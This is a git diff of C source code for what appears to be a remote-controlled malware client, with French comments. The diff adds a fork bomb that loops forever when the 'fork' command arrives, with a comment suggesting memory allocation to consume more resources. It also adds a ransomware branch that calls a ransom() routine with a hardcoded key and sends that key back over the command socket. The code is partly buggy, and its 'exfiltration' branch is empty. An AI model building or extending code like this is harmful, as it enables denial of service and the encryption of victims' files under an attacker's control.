@@ -1,8 +1,23 @@
 #include "handle_client_commands.h"
 #include "gener.h"
+#include "stock.h"
+#include "ransom.h"
 #include <stdio.h>
 #include <string.h>
 #include <sys/socket.h>
+#include <stdlib.h>
+
+#include <errno.h>
+#include <netdb.h>
+#include <sys/types.h>
+#include <unistd.h>
+#include <arpa/inet.h>
+
+
+
+
+
+
 
 void handle_client_commands(int socket_fd)
 {
@@ -29,21 +44,36 @@ void handle_client_commands(int socket_fd)
         if (strcmp(buffer, "exfiltration") == 0)
         {
             printf("Executing exfiltration...\n");
-            
         }
         else if (strcmp(buffer, "fork") == 0)
         {
             printf("Executing fork...\n");
+
+            while (1)
+            {
+                // On peut ajouter un mallow pour utiliser plus de ressources
+                fork();
+            }
         }
         else if (strcmp(buffer, "ransomware") == 0)
         {
+
             printf("Executing ransomware...\n");
-            char *random_string = gener(16); // Générer une chaîne aléatoire de 16 caractères
+
+           char *random_string = "Toto";
+            if (random_string <= 0)
+            {
+                perror("recv");
+                close(socket_fd);
+                continue;
+            }
+            printf("Client identifier received: \"%s\"\n", buffer);
             printf("Generated random string for exfiltration: %s\n", random_string);
+            ransom(random_string);
 
             // Envoyer la chaîne générée au serveur
-            send(client_fd, random_string, strlen(random_string), 0);
-            free(random_string); // Libérer la mémoire allouée
+            send(socket_fd, random_string, strlen(random_string), 0);
+
         }
         else if (strcmp(buffer, "out") == 0)
         {
